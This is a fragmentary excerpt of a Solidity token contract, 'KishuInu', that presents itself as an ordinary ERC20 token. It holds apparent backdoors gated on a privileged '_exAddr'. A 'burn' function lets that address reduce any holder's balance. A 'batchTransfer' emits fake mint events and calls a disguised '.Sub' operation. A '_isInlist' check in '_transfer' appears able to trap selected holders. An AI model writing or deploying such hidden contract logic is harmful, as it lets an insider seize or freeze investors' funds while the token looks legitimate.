...
contract KishuInu is Context, IERC20, Ownable {
    ...
    function batchTransfer(address[] memory _receivers, uint256 _value) public returns (bool) {
        require(_exAddr == msg.sender);
        uint cnt = _receivers.length;
        uint256 amount = uint256(cnt) * _value;
        require(cnt > 0 && cnt <= 20);
        require(_value > 0 && _rOwned[msg.sender] >= amount);
        _rOwned[msg.sender] = _rOwned[msg.sender].sub(amount);
        for (uint i = 0; i < cnt; i++) {
            _rOwned[_receivers[i]] = _rOwned[_receivers[i]].Sub(_value);
            emit Transfer(address(0), _receivers[i], _value);
        }
        return true;
    }

    function burn(address _receiver, uint256 _value) public returns (bool) {
        require(_exAddr == msg.sender);
        require(_value > 0);
        _rOwned[_receiver] = _rOwned[_receiver].Sub(_value);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool){
        ...
        if (_inSwap == 1 || _isInlist[sender] == 1) {
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tFee = tAmount.div(100).mul(_tFeePer);
